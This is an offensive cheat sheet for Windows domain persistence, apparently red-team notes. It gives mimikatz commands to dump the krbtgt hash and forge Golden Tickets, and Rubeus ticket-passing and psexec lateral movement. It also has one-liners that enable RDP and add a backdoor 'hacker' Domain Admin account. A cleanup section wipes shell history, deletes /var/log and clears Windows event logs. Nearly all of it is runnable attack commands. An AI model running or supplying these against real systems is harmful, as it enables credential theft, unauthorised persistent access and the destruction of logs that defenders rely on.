## Persistence

### 1. Golden/Silver Ticket (Kerberos Persistence)
- Dump `krbtgt` hash and domain SID:
```plaintext
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```
- Use Golden Ticket from attacking Windows machine (run as Administrator):
```plaintext
kerberos::golden /User:Administrator /domain:DOMAIN.local /sid:S-1-5-21-xxxxxxxxxx-xxxxxxxxx-xxxxxxxxx /krbtgt:<ntlm_hash> /id:500 /ptt
```
- Using Rubeus:
```Powershell
python getTGT.py domain.local/username:password -dc-ip <DC-IP>

python ticketConverter.py username.ccache ticket.kirbi

.\Rubeus.exe ptt /ticket:ticket.kirbi

.\Rubeus.exe asktgs /user:username /domain:domain.local /dc:<DC-IP> /ticket:ticket.kirbi /service:HTTP/<target> /outfile:ticket.kirbi

.\Rubeus.exe ptt /ticket:ticket.kirbi

klist

Enter-PSSession -ComputerName <target> -Authentication Kerberos
```
- Access other systems using ticket:
```cmd
dir \\10.0.0.25\C$

dir \\TARGETHOST\C$

Exec64.exe \\10.0.0.25 cmd.exe

psexec.exe \\TARGETHOST cmd.exe
```

---
### 2. Enable RDP and Add Domain Admin

```PowerShell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes && net user /add hacker hacker && net localgroup administrators hacker /add && net localgroup "Remote Desktop Users" hacker /add
```
### 3. Just Add a New Domain Admin
```cmd
net user hacker password123 /add
```
- Then use Server Manager or:
```cmd
net group "Domain Admins" hacker /add /domain
```

---

🧹 Sanitization & Cleanup
- Linux:
```bash
# Clear shell history
history -c

# Remove temporary files
rm -rf /tmp/* /var/tmp/*

# Remove system logs (requires root)
rm -rf /var/log/*

# Optional: overwrite bash history files
> ~/.bash_history
> /root/.bash_history
> ```
- Windows:
```Powershell
# Clear PowerShell history (if stored)
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Delete temp files
del /q/f/s %TEMP%\*

# Clear event logs (requires admin)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```